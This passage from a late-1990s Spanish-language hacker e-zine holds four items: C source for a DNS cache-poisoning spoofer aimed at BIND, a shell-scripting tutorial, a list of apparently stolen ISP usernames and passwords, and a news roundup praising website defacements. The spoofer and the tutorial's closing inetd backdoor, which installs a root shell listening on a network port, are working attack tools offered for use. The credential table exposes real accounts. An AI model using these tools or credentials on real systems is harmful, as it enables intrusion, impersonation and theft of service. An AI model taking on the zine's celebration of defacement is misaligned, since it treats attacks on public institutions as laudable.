       len=(unsigned short)*(p++);
       while (len) {
         while (len = 0xC0) {
           if (!b)
             b=p+1;
           p=buf+(ntohs(*((unsigned short *)(p-1))) & ~0xC000);
           len=(unsigned short)*(p++);
         }

         for (i=0;i<len;i++)
           *(s++)=*(p++);

         *(s++)='.';

         len=(unsigned short)*(p++);
       }

       *(s++)=0;
       if (b)
         return(b);

       return(p);
     }

     char *dnsaddlabel(char *p, char *label)
     {
       char *p1;

       while ((*label) && (label)) {
         if ((*label == '.') && (!*(label+1)))
           break;

         p1=strchr(label,'.');

         if (!p1)
           p1=strchr(label,0);

         *(p++)=p1-label;
         memcpy(p,label,p1-label);
         p+=p1-label;

         label=p1;
         if (*p1)
           label++;
       }
       *(p++)=0;

       return(p);
     }

     #define DEFAULTTTL 60*10

     void dnstxt2rr(dnsrrrec *rr, char *b)
     {
       char *tok[20], *p;
       unsigned short numt=0, i;
       static char *buf=NULL;

       if (!buf) {
         if ((buf=malloc(1024)) == NULL) {
           perror("malloc");
           exit(-1);
         }
       }

       strcpy(buf,b);
       p=strtok(buf," \t");
       do {
         tok[numt++]=p;
       } while (p=strtok(NULL," \t"));

       p=dnsaddlabel(rr-label,tok[0]);
       rr-labellen=p-rr-label;

       i=1;

       if (isdigit(*p))
         rr-ttl=htonl(atol(tok[i++]));
        else
         rr-ttl=htonl(DEFAULTTTL);

       if (strcmp(tok[i],"IN") == 0)
         i++;

       rr-class=htons(1);

       if (strcmp(tok[i],"A") == 0) {
         i++;
         rr-type=htons(DC_A);
         if (i < numt) {
           inet_aton(tok[i],rr-buf);
           rr-buflen=4;
         } else
           rr-buflen=0;
         return;
       }

       if (strcmp(tok[i],"CNAME") == 0) {
         i++;
         rr-type=htons(DC_CNAME);
         if (i < numt) {
           p=dnsaddlabel(rr-buf,tok[i]);
           rr-buflen=p-rr-buf;
         } else
           rr-buflen=0;
         return;
       }

       if (strcmp(tok[i],"NS") == 0) {
         i++;
         rr-type=htons(DC_NS);
         if (i < numt) {
           p=dnsaddlabel(rr-buf,tok[i]);
           rr-buflen=p-rr-buf;
         } else
           rr-buflen=0;
         return;
       }

       if (strcmp(tok[i],"PTR") == 0) {
         i++;
         rr-type=htons(DC_PTR);
         if (i < numt) {
           p=dnsaddlabel(rr-buf,tok[i]);
           rr-buflen=p-rr-buf;
         } else
           rr-buflen=0;
         return;
       }

       if (strcmp(tok[i],"MX") == 0) {
         i++;
         rr-type=htons(DC_MX);
         if (i < numt) {
           p=rr-buf;
           *((unsigned short *)p)=htons(atoi(tok[i++])); p+=2;
           p=dnsaddlabel(p,tok[i]);
           rr-buflen=p-rr-buf;
         } else
           rr-buflen=0;
         return;
       }
     }

     void dnsbuildpacket(dnsrec *dns, short qdcount, short ancount, short nscount,
     short arcount, ...)
     {
       int i;
       va_list va;

       dns-h.qdcount=htons(qdcount);
       dns-h.ancount=htons(ancount);
       dns-h.nscount=htons(nscount);
       dns-h.arcount=htons(arcount);
       dns-h.rcode=0;

       va_start(va, arcount);

       for (i=0;i<qdcount;i++)
         dnstxt2rr(&dns-qd[i],va_arg(va, char *));

       for (i=0;i<ancount;i++)
         dnstxt2rr(&dns-an[i],va_arg(va, char *));

       for (i=0;i<nscount;i++)
         dnstxt2rr(&dns-ns[i],va_arg(va, char *));

       for (i=0;i<arcount;i++)
         dnstxt2rr(&dns-ar[i],va_arg(va, char *));

       va_end(va);
     }

     char *dnsaddbuf(char *p, void *buf, short len)
     {
       memcpy(p,buf,len);
       return(p+len);
     }

     int dnsmakerawpacket(dnsrec *dns, char *buf)
     {
       char *p;
       int i;
       unsigned short len;

       memcpy(buf,&dns-h,sizeof(dnsheaderrec));

       p=buf+sizeof(dnsheaderrec);

       /********** Query ***********/
       for (i=0;i<ntohs(dns-h.qdcount);i++) {
         p=dnsaddbuf(p,dns-qd[i].label,dns-qd[i].labellen);
         p=dnsaddbuf(p,&dns-qd[i].type,2);
         p=dnsaddbuf(p,&dns-qd[i].class,2);
       }

       /********** Answer ***********/
       for (i=0;i<ntohs(dns-h.ancount);i++) {
         p=dnsaddbuf(p,dns-an[i].label,dns-an[i].labellen);
         p=dnsaddbuf(p,&dns-an[i].type,2);
         p=dnsaddbuf(p,&dns-an[i].class,2);
         p=dnsaddbuf(p,&dns-an[i].ttl,4);
         len=htons(dns-an[i].buflen);
         p=dnsaddbuf(p,&len,2);
         p=dnsaddbuf(p,dns-an[i].buf,dns-an[i].buflen);
       }

       /********** Nameservers ************/
       for (i=0;i<ntohs(dns-h.nscount);i++) {
         p=dnsaddbuf(p,dns-ns[i].label,dns-ns[i].labellen);
         p=dnsaddbuf(p,&dns-ns[i].type,2);
         p=dnsaddbuf(p,&dns-ns[i].class,2);
         p=dnsaddbuf(p,&dns-ns[i].ttl,4);
         len=htons(dns-ns[i].buflen);
         p=dnsaddbuf(p,&len,2);
         p=dnsaddbuf(p,dns-ns[i].buf,dns-ns[i].buflen);
       }

       /********** Additional ************/
       for (i=0;i<ntohs(dns-h.arcount);i++) {
         p=dnsaddbuf(p,dns-ar[i].label,dns-ar[i].labellen);
         p=dnsaddbuf(p,&dns-ar[i].type,2);
         p=dnsaddbuf(p,&dns-ar[i].class,2);
         p=dnsaddbuf(p,&dns-ar[i].ttl,4);
         len=htons(dns-ar[i].buflen);
         p=dnsaddbuf(p,&len,2);
         p=dnsaddbuf(p,dns-ar[i].buf,dns-ar[i].buflen);
       }

       return(p-buf);
     }

     void main(int argc, char *argv[])
     {
       int sock, fromlen, numread, len, query;
       struct sockaddr_in sa, from, to;
       struct in_addr rev;
       char *buf, *sendbuf;
       char *domainnamebuf;
       dnsheaderrec *dns;
       char *p;
       dnsrec dnsh;

       char *beginhost_QD, *beginhost_A, *beginhost_srch;
       char *fakenshost_A, *fakens_DOM;
       char *spoofedip_A, *spoofedip_PTR, *spoofedip_rev;

       printf("\n");
       printf("jizz %s -- dns spoofer (BIND cache vuln.)\n",VERSION);
       printf("by nimrood\n\n");
       if (argc != 7) {
         printf("usage: \n%s \n",argv[0]);
         printf("\n");
         printf("    beginhost  : requested to initiate false caching, ex: begin.ib
     6ub9.com\n");
         printf("    fakenshost : server name to answer false PTR's, ex: ns.ib6ub9.
     com\n");
         printf("    fakensip   : IP of server name to answer false PTR's, ex: 205.
     160.29.19\n");
         printf("    fakensdom  : domain name false name server controls, ex: ib6ub
     9.com\n");
         printf("    spoofedip  : IP of machine you want to spoof from, ex: 204.154
     .2.93\n");
         printf("    spoofedhost: name you want to spoof, ex: teak.0wns.j00\n\n");
         exit(-1);
       }

       if ((beginhost_QD = malloc((strlen(argv[1]))+5+1)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((beginhost_A = malloc(strlen(argv[1])+15+1)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((beginhost_srch = malloc(strlen(argv[1])+1+1)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((fakenshost_A = malloc(strlen(argv[2])+strlen(argv[3])+6+1)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((fakens_DOM = malloc(strlen(argv[4])+strlen(argv[2])+4+1)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((spoofedip_A = malloc(strlen(argv[6])+strlen(argv[5])+6+1)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((spoofedip_PTR = malloc(strlen(argv[5])+strlen(argv[6])+21+1)) == NULL)
     {
         perror("malloc");
         exit(-1);
       }

       if ((spoofedip_rev = malloc(strlen(argv[5])+1)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((buf = malloc(MAXBUFSIZE)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((sendbuf = malloc(MAXBUFSIZE)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((domainnamebuf = malloc(MAXBUFSIZE)) == NULL) {
         perror("malloc");
         exit(-1);
       }

       if ((sock=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
         perror("socket");
         exit(-1);
       }

       beginhost_QD = strcpy(beginhost_QD,argv[1]);
       beginhost_QD = strcat(beginhost_QD, " IN A");

       beginhost_A = strcat(strcpy(beginhost_A,beginhost_QD), " 127.0.0.1");

       beginhost_srch = strcat(strcpy(beginhost_srch,argv[1]), ".");
       printf("%s\n",beginhost_srch);

       fakenshost_A = strcat(strcpy(fakenshost_A,argv[2]), " IN A ");
       fakenshost_A = strcat(fakenshost_A, argv[3]);

       fakens_DOM = strcat(strcpy(fakens_DOM,argv[4]), " IN NS ");
       fakens_DOM = strcat(fakens_DOM,argv[2]);

       spoofedip_A = strcat(strcpy(spoofedip_A,argv[6]), " IN A ");
       spoofedip_A = strcat(spoofedip_A,argv[5]);

       rev.s_addr = rev_long(inet_addr(argv[5]));
       spoofedip_PTR = strcat(strcpy(spoofedip_PTR,(char *)inet_ntoa(rev.s_addr)),
     ".IN-ADDR.ARPA IN PTR ");
       spoofedip_PTR = strcat(spoofedip_PTR,argv[6]);

       printf("%s\n%s\n%s\n%s\n%s\n%s\n",

     beginhost_QD,beginhost_A,fakenshost_A,fakens_DOM,spoofedip_A,spoofedip_PTR);

       sa.sin_family = AF_INET;
     /*  sa.sin_addr.s_addr = inet_addr(DEFAULTBINDHOST); */
       sa.sin_addr.s_addr = INADDR_ANY;
       sa.sin_port = htons(53);

       if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
         perror("bind");
         exit(-1);
       }

       setvbuf(stdout,NULL,_IONBF,0);

       while (1) {
         fromlen=sizeof(from);
         if ((numread = recvfrom(sock, buf, MAXBUFSIZE, 0, (struct sockaddr
     *)&from, &fromlen)) < 0) {
           perror("recvfrom");
           continue;
         }

         /* Kludge to stop that damn router */
         if (from.sin_addr.s_addr == inet_addr("206.126.32.10"))
           continue;

         dns=(dnsheaderrec *)buf;

         if (dns-qr)
           continue;

         p=dnssprintflabel(domainnamebuf,buf,&buf[sizeof(dnsheaderrec)]);
         query=ntohs(*(unsigned short *)p);
         printf("Packet from %s : %d : %s
     (%d)\n",inet_ntoa(from.sin_addr),ntohs(from.sin_port),domainnamebuf,query);

         if (strcasecmp(domainnamebuf,beginhost_srch) == 0) {
           dnsbuildpacket(&dnsh,1,4,1,1,
             beginhost_QD,

             beginhost_A,
             spoofedip_A,
             spoofedip_PTR,
             fakenshost_A,

             fakens_DOM,

             "www.yahoo.com IN A 255.255.255.255");

         } else {
           /* Error */
           dnsh.h.rcode=5;
           strcat(domainnamebuf," IN A");
           dnsbuildpacket(&dnsh,1,0,0,0,
             domainnamebuf);
         }
         dnsh.qd[0].type=htons(query);

         dnsh.h.id=((dnsheaderrec *)buf)-id;
         dnsh.h.qr=1;
         dnsh.h.aa=1;

         len=dnsmakerawpacket(&dnsh,sendbuf);

         to.sin_family=AF_INET;
         to.sin_addr.s_addr=from.sin_addr.s_addr;
         to.sin_port=from.sin_port;

         if (sendto(sock,sendbuf,len,0,(struct sockaddr *)&to,sizeof(to)) < 0) {
           perror("sendto");
           continue;
         }
       }
     }

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

               U N I X   S H E L L   S C R I P T I N G
                     Yo_Soy  <varf@bigfoot.com>


  Los scripts sh o BourneShell scripts son un conjunto de comandos del
  shell en un archivo de texto comun, y para llamar a ese conjunto de
  comandos, solamente es necesario ejecutar el script colocando el
  nombre del script en el interprete de comandos (para ello primero
  debera ser ejecutable o permisos de ejecucion +x)

  Para que aquellos que esten familiarizados con MS DOS es similar a
  los batch. A continuacion tratare de dar una introduccion a lo que
  es la creacion de los mismos.

  Tomamos nuestro editor de texto que mas nos gusta y comenzamos a
  tirar nuestras primeras lineas, comenzamos con la frase tan popular:

  -------------------------
  #!/bin/sh
  echo "Hola mundo XDDD"
  ------------------------

  Tras a haber creado nuestro primer script, lo guardamos y lo
  ejecutamos (si es que tenemos permiso). Damos permisos de ejecucion
  a nuestro script:

  $ chmod +x script

  Y lo ejecutamos sin necesidad de compilacion u otra cosa:

  $ ./script
  Hola Mundo XDDD
  $

  Bueno, analicemos nuestro primer script que acabamos de crear, la
  primera linea '#!/bin/sh' dice donde esta el shell y le dice que
  debe ejecutar el conjunto de comandos del shell sh. En la segunda
  linea usamos ECHO, la orden 'echo' permite mostrar mensajes en la
  pantalla.

  Es posible ver paso a paso el archivo mientras se ejecuta, y ver
  como se desarrollan todos los comandos, (muy util para depurar
  nuestros scripts), para ello ejecutamos nuestro script asi:

  $ sh -x script


  ===[ Comentarios
      
  Los comentarios es la parte de nuestro script que no va a ser
  ejecutado y nos sirve para identificar ciertas partes del mismo,
  estas van despues del simbolo # (una por linea), por ejemplo:

  -------------------------
  #!/bin/sh
  # Esto es un comentario
  # esto tambien es un comentario
  # y otro XD
  echo "Hola mundo"
  ------------------------


  ===[ Variables

  Las variables se definen: nombre_variable=contenido_variable ,asi si
  queremos  tener una  variable  llamada RM  con  el contenido : "Raza
  Mexicana" lo hariamos asi:

  $ RM="Raza Mexicana"

  Debes tener en cuenta el no usar espacios despues del signo de igual

  ---------------------------------
  #!/bin/sh
  # Programa de ejemplo de variables.
  RM="Raza Mexicana"
  echo "La variable RM vale: $RM"
  ----------------------------------
  
  Aqui hay algo nuevo, y es que todas las variables van precedidas del
  signo $ para que el shell recupere el valor de la variable. Asi
  podriamos asignar el valor de una variable a un archivo, por ejemplo,
  que quisieramos ver el contenido de /etc/passwd:

  ---------------------------------
  #!/bin/sh
  # Programa de ejemplo de variables.
  ARCHIVO="/etc/passwd"
  cat $ARCHIVO
  ----------------------------------

  Habra veces en que queramos usar con un echo o cualquier otro
  comando el caracter $, pero como el shell lo tiene reservado para
  el uso de las variables, no lo podremos usar, para ello simplemente
  colocamos el caracter "\" antes del $, por ejemplo:

  ---------------------------------
  #!/bin/sh
  # Programa de ejemplo de variables.
  RM="Raza Mexicana"
  echo "\$RM"
  ----------------------------------

  Lo ejecutamos:

  $./script
  $RM
  $

  Y nos mostro lo que queriamos y no la variable que ya habiamos
  definido. Lo mismo hubiera ocurrido si en lugar de "" hubieramos
  usado '' en el echo, el programa quedaria asi:

  ---------------------------------
  #!/bin/sh
  # Programa de ejemplo de variables.
  RM="Raza Mexicana"
  echo '$RM'
  ----------------------------------

  La salida del programa es similar a la anterior.

  En el Shell existen variables especiales, a continuacion van varias
  de ellas:

         Variable                Significado

          HOME         Nombre de la ruta del directorio del usuario
          SHELL        Nombre de la shell actual
          MAIL         Ruta del buzon del usuario
          LOGNAME      Nombre del login actual
          HISTFILE     Nombre del archivo del historial
          IFS          Caracter 
          PATH         Ruta en la que el shell busca los comandos
          PS1          Prompt o indicador
          TERM         Tipo de terminal
          TZ           Zona horaria


  ===[ Estructuras controladas


   CASE

   Permite seleccionar de una o varias opciones, segun el valor de
   una variable.

       Sintaxis :   case palabra in                        
                        parametro-1 ) instrucciones-1 ;;              
                        parametro-2 ) instrucciones-2 ;;              
                        parametro-3 ) instrucciones-3 ;;              
                        .                                      
                        .                                      
                        *)                                      
                    esac                                        

    La palabra ESAC ( CASE al reves ) determina el fin de la
    instruccion CASE, ejemplo:

    -----------------------------------------
    #!/bin/sh
    # Programa ejemplo del uso de CASE
    echo 'Coloque A, B, o C: \c'
    read letra
    case $letra in                                                
      A) echo 'Escribiste A' ;;                                  
      B) echo 'Escribiste B' ;;                                  
      C) echo 'Escribiste C' ;;                                  
      *) echo 'No escribiste ni A, B, o C' ;;                   
    esac                                                           
    -----------------------------------------

  Este script verifica que se ingrese un caracter (usando READ para leer)
  lo coloca en la variable $letra y compara los valores para determinar
  la opcion. Asi el script quedaria:

   $ ./script
   Coloque A, B, o C: B
   Escribiste B                                                  

  Y en caso de no ingresar ninguna de las opciones:

   $ ./script
   Coloque A, B, o C: b
   No escribiste ni A, B, o C
   $                                                              


  ===[ Condiciones

  Podemos usar IF ... FI para seleccionar entre dos posiblidades de
  accion, el formato de la sintaxis es asi:

     if expresion
        then  comandos
     fi                                          

    -------------------------------------
    #!/bin/sh
    #Programa ejemplo del uso de IF
    usuario=root
     if
       who  grep $usuario >/dev/null
     then
       echo "$usuario esta conectado"
     else
       echo "$usuario no esta conectado"
     fi
     echo "Fin"
    -------------------------------------

   El anterior programa determina si $usuario (que es la variable
   que definimos) esta conectado, para ello verifica que la cadena
   $usuario se encuentre en la salida del comando 'who' usando 'grep'.


   ===[ Bucles

   FOR

   El formato de la sintaxis es:
      
         for variable in lista-argumentos
         do                                     
             comando
             :
             comando 
         done                                   

  Esta estrutura asignara el valor al primer elemento en la lista
  y ejecutara los comando entre el DO y el DONE (que son los que
  definen el principio y fin del bucle).

  WHILE

   El formato de la sintaxis es:

     while condicion
     do
       comando
       :
       comando
     done

   La diferencia entre for y while es que while comprueba la condicion
   y apartir de eso decide si ejecuta el bloque de comando o no.


   ===[ TEST

   Verifica ciertos criterios, los criterios se aplican a archivos y
   comparacion de numeros.

   - Opciones para archivos (devuelve verdadero si)

   0 = Verdadero   1 = Negativo

   -f   Si el archivo es ordinario
   -d   Si es un directorio
   -r   Si es legible
   -s   Si existe y no esta vacio
   -w   Si existe y tiene permiso de escritura
   -x   Si existe y es ejecutable
   -b   Si es un archivo de bloque especial
   -c   Si es un archivo de caracter especial

   - Opciones para numeros

   -eq  Igual
   -ne  Desigual
   -ge  Mayor o igual que
   -gt  Mayor que
   -le  Menor o igual que
   -It  Menor

  Si deseas profundizar en cada instruccion, lee las paginas man que le
  correspondan, de despidad dejo una backdoor sencilla basada en el
  codigo de DaCure mbdoor.c (Todo el credito va a DaCure, solo lo hago
  para demostrar que podia hacerse en shell script y para ilustrar este
  articulo)

  Aqui va:

  ---------------------------------------------------------------------
  #!/bin/sh
  #
  # inetd.conf Backdoor by Yo_Soy <varf@bigfoot.com>
  # -------[ RareGaZz & Raza Mexicana Team ]--------
  #
  # Solo ejecuta el script y obtendras una shell en el puerto especificado
  # Basado en el mbdoor.c de DaCure =P
  # Modifique este linea para el puerto que desea:
  SERVICIO="varf    1999/tcp"
  DEMONIO="varf stream tcp nowait root /bin/sh /bin/sh -i"
  #
  # Cuerpo del script
  #
  echo
  echo  " inetd Backdoor by Yo_Soy - <varf@bigfoot.com>"
  echo  "   [ RareGaZz & Raza Mexicana Hackers Team ]  "
  echo
  echo  " Instalando..."
  echo $SERVICIO >> /etc/services
  echo  " Servicio $SERVICIO instalado."
  echo $DEMONIO >> /etc/inetd.conf
  echo  " Daemon $DEMONIO instalado."
  killall -HUP inetd
  echo " -HUP enviado al demonio inetd ".
  echo " Terminado!. La backdoor esta instalada."
  echo
  ---------------------------------------------------------------------

                                                        Saludos
                                               Yo_Soy - <varf@bigfoot.com>

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 
                           ISP INTERNET ACCOUNTS


    Algunas cuentas de ISP Mexicanos de diferentes zonas del pais para
    el uso y disfrute del lector de raza mexicana....


    ---- ISP -----------   ---- Cuenta ------     --- Cortesia ---
  
    Telmex IDP             luisedo  / galaxia       Vlad
    Podernet Apizaco       bacei    / BArce9        Yo_Soy
    Podernet Tapachula     verocaps / VEro1         Yo_Soy 
    Podernet Monclova      millin   / MIllin76      Yo_Soy 
    Podernet Colima        eherrera / 1DRACO1       Yo_Soy 
    Podernet Leon          aolmos   / ITCHI43       Yo_Soy 
    Podernet Puebla        zoletto  / OScarc99      Yo_Soy 


 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                           
                    --- Incidencias en Latinoamerica ---
                                by alt3kx

 En los ultimos aคos se ha dado un alto crecimiento sobre el Hacking a
 nivel latinoamericano, se encuentran casos en los ke el FBI a tenido ke
 intervenir asi ke voy hacer una breve reseคa sobre los ultimos
 acontecimientos ya ke en pasados numeros no se habia publicado.

 A continuacion muestro una serie de casos en diferentes paises : 


 ----[ Brasil 


 Estos Hackers Brasileคos mencionan ke peretenecen a un grupo llamado
 "Blow TEam" , mecionan haber estado cansandos de atakar paginas de su
 gobierno por la gran facilidad y vuneravilidad que tienen , su decicion
 fue atakar paginas de Estados Unidos en las ke cabe mencionar la pagina
 del "Departamento de Agricultura de Estados Unidos", los Hackers
 postearon mensajes en portugues en las paginas de "Servicio de Alimentos
 y Nutricion , Servicio de Inspeccion Alimenticia, Division de desarrollo
 Rural y el Servicio Forestal" su mensaje fue :

 ""Blow estuvo aqui", 
 "Nos cansamos de adueคarnos de los gov.br y ahora nos divertimos con
  sus sitios"

 Los crackers del grupo Blow Team han protestado contra el gobierno del
 presidente Fernando Henrique Cardoso modificando las paginas
 gubernamentales de este pais.

 ( Sigan asi camaradas =) 


 ----[ Colombia 

 La policia colombiana detuvo a un hombre de 24 aคos, sospechoso de ser
 el autor de mensajes de correo electronico en Internet con informacion
 falsa sobre el banco Davivienda, que provocaron retiros masivos delos
 ahorristas por unos 30 000 millones de pesos (20 millones de dolares).

 EL grupo DAS ( Departamento Administrativo de Seguridad ) acargo del
 Coronel German Jaramillo, meciono sobre la captura de Jose Omar Olaya
 se produjo en Buenaventura, el principal puerto de Colombia sobre el
 Pacifico.

 Agentes de una nueva unidad especializada en delitos a traves de Internet
 con la colaboracion del FBI en Estados Unidos, adelantaron durante un mes
 el seguimiento de los mensajes que alarmaron a los ahorristas de Davivienda,
 uno de los diez mas grandes bancos colombianos.

 Durante sus investigaciones obtuvieron datos sobre la Universidad de
 Kentucky, desde donde se logro establecer el origen del mensaje segun
 el DAS.

 Su captura se origino despues de ke Olaya envio mesajes originales
 a diferentes lugares donde pudo ser rastreado a travez de internet.


 En ese mensaje Olaya se burlaba del efecto de sus primeros mensajes
 en los que cuestiono la solvencia financiera de Davivienda, que logro
 sortear la crisis a pesar de los millonarios retiros, equivalentes al
 monto que los colombianos realizan en fechas como la navidad.


 (  sucks FBI =(  )


 ----[ Argentina

 El sitio web de la Secretaria Nacional de Comunicaciones de Argentina,
 ha sido "hackeado" esta noche por "dr_fdisk", uno de los grupos de
 piratas informaticos mas activos de las ultimas semanas, segun han
 comunicado sus autores en un correo electronico.

 En la pagina "home", los "hackers" han eliminado los elementos graficos
 originales del organismo gubernamental argentino y colocado el siguiente
 mensaje: "Estamos hartos de pagar las comunicaciones tan caras.
 Queremos tarifa plana! Ustedes dijeron que Argentina forma parte del
 primer mundo. Bueno, entonces ya que somos el primer mundo como Mexico,
 EE.UU, etc. Queremos la tarifa plana! Otro tema: Tambien estamos hartos
 e la inseguridad. hagan algoen vez de incentivar a los homicidas". 

 En la misma linea de protesta ante la Guerra de los Balcanes,
 "Dr_fdisk" tambien asalto esta semana el sitio web www.ivic.net .
 A primeros de mes, penetro en la TV Azteca de Mexico y en un sitio
 dedicado a informacion sobre Linux, segun se indicaba la semana pasada
 en este periodico.


 ( yeea dr_fdisk y no es un TEAM es un solo individuo, miembro de raza =)
   datos de la Brujula.net ).


 ----[ Mexico 


 Subasta inmobilaria por        por DaCure y DeadSectr 
 www.camaradediputados.gob.mx   por dr_fdisk           
 www.bcb.gov.bo                 por dr_fdisk           
 www.pronet.com.mx              por Acidgum            

 Una ciberprotesta a nivel mundial realizo la semana pasada un grupo de
 hackers en apoyo a Kevin Mitnick, condenado a prision por realizar actos
 de pirateria electronica, quien cumplio cuatro aคos de estar recluido
 en una carcel de Estados Unidos.

 El ataque fue en contra de di-ferentes sitios de la WWW a nivel
 mundial, incluyendo los de em-presas e instituciones publicas y privadas
 de diferentes paises. En Mexico la Camara de Diputados, ID Software y
 La Guia Virtual de la Ciudad de Mexico fueron blanco de los ataques de
 los hackers, al violar la seguridad de acceso. Algunas de las paginas
 de los sites afectados mostraron manifestaciones de solidaridad hacia
 Kevin Mitnick, exigiendo que le fuera concedida la libertad inmediata.

 Lo ocurrido la semana pasada no es la primer manifestacion de apoyo a
 Mitnick, porque desde diciembre de 1997, dos ciberpiratas amenazaron
 emprender la destruccion de millones de computadoras en todo el mundo,
 al haber colocado lo que llaman una "bomba logica", la cual se activaria
 el dia de Navidad de ese mismo aคo, a menos de que el gobierno
 estadounidense liberara al famoso hacker.

 Datos reforma NEWS 


 www.cndh.org.mx  por alt3kx_H3z  Raza Mexicana

 La pagina en Internet de la mexicana Comision Nacional de Derechos Humanos
 (CNDH) fue atacada por hackers que se identificaron como del grupo
 Raza Mexicana.

 Los responsables del ataque suplantaron la pagina de inicio de la
 institucion gubernamental, con un llamado a los lideres de los
 principales partidos opositores en Mexico para unir fuerzas por
 la construccion de "un Mexico nuevo".

 Durante algunos minutos por la maคana del jueves 11, la pagina ubicada
 en www.cndh.org.mx desplego la "carta abierta" de los hackers, firmada
 por Leyenda Urbana 99, que instaba a los partidos de la Revolucion
 Democratica (centroizquierda) y Accion Nacional (centroderecha) a formar
 un programa de gobierno "ni de derecha ni de izquierda", definido como
 "un programa patriota, responsable y de salvacion".

 La pagina fue restablecida en poco tiempo por los responsables
 informaticos de la CNDH, sin que hasta el momento haya habido un
 pronunciamiento oficial al respecto.

 Datos Mexis 


 www.tam.itesm.mx              por  alt3kx_H3z 
 www.camaradediputados.gob.mx  por  dr_fdisk   

 Un Hacker llamdo "dr_fdisk" irrumpio es este sitio y escribio ahi
 saludos para todos sus amigos al respecto, Sara Salas, directora de
 informacion de dicha institucion, declaro a QUO " No tenemos niguan
 informacion al respecto, No ha habido ningun problema".

 Tecnologico de monterrey, el pirata informatico "altekx_H3z" cambio
 la fisonomia de este sito web para mofarse de esta campus del Tecnologico
 de Monterrey y de la empresa Telmex, El administrador de la pagina no
 quiso hacernos ningun comentario.

 Datos Revista QUO   (autografiamos copias =P )


 "Los hackers mexicanos vienen  del interior de las empresas"

 El 85% de los "hackers" provienen del interior de las empresas,
 dijo el director general de la division de empresas de Alcatel
 Mexico, Pedro Luis Sanchez. 
 Seคalo que por lo anterior y para evitar perdidas millonarias de
 dinero y fraudes en la red de datos o en el intranet, es necesario
 implementar nuevos sistemas de seguridad en las operaciones
 electronicas en el sector financiero de Mexico. 
 En conferencia de prensa, anuncio que ante el desarrollo de las
 redes, las instituciones financieras deben de controlar sus sistemas
 y buscar soluciones ante "los nuevos enemigos de la red". 
 Por el Web, aคadio, se puede encontrar a los "hackers externos",
 debido a que cuando logran cruzar las barreras de la institucion,
 tienen los elementos para romper los codigos de seguridad de la
 intranet, donde esta la informacion delicada de la empresa.Muchos
 de estos problemas, indico, se podrian evitar si se instalara un
 sistema adecuado llamado Virtual LANS y un sistema de autenticacion
 de usuario a fin de lograr las operaciones y de impedir que estos
 defraudadores entren a las areas estrategicas de la empresa donde
 no tenian que entrar. 
 Sanchez agrego que Alcatel propone un nuevo sistema de autenticacion 
 llamado Check Point, que permite acceso solo a los usuarios
 autorizados a las aplicaciones de riesgo para la empresa. 
 Este sistema, insistio, es una barrera que impide el acceso a 
 los "hackers", porque ademas de otorgar seguridad al intranet,
 tambien vigila el internet. 
 Comento que las empresas estan estableciendo redes a traves de
 internet han estado ahorrando "una enorme cantidad de dinero",
 porque dicho medio abate el costo de las largas distancias, 
 sin embargo, tales ahorros representan graves riesgos si
 los empresarios no atienden el sistema de seguridad de 
 sus redes. 
 Por tal motivo, manifesto, la estrategia de negocios de
 Alcatel se ha orientado hacia la compra de empresas lideres 
 en el mercado de acceso y transporte de redes de datos y que
 surja en el mercado la oferta mas solida para integrar voz
 y datos en redes confiables y al menor costo sobre los Protocolos
 Internet (IP). 

 [ Nota del Editor (YO): Excusas y mas excusas, hagan bien su trabajo
   seคores, como es posible que les paguen por hacer nada!...
   Nosotros deberiamos estar ahi ganando dinero... Yo_Soy ]
   
 Como pueden ver Mexico no es la excepcion, ahora con la legislacion
 anti-Hacking tenemos ke ponernos mas buzos, com ven el caso en Colombia
 el FBI tuvo ke intervenir , ke nos hace pensar ke en Mexico no pasara
 lo mismo ?... ...



 www.teqcorp.com.mx      alt3kx_H3z Raza-Elite

 Hackean un ISP mexicano denunciando la politica del Presidente Zedillo 
 Por: Mario Aburto Castellanos

 MEXIS Septiembre 7 de 1999.- Ciudad de Mexico.- Un grupo de hackers se
 responsabilizo por elataque perpetrado a varios sitios mexicanos, uno con
 sede en la ciudad de San Luis Potosi (centro) y otros dos que pertenecen
 al gobierno del Estado de Mexico (centro) y de Tabasco (sureste),
 respectivamente.

 Los ciberpiratas se hacen llamar alt3kx_H3z, y avisaron sobre la
 publicacion del hacking a la pagina Web http://www.teqcorp.com.mx,
 propiedad de un ISP mexicano de San Luis Potosi, a La Brujula.

 La pantalla del "hackeo" que publica la organizacion de ciberpiratas
 Attrition, presenta la animacion de una tarantula en fondo negro y con
 el siguiente texto en color verde fluorescente:

 "Manifestamos la forma en ke la UNAM AUN NO HA SIDO LIBERADA DE PARISTAS
 IDIOTAS...

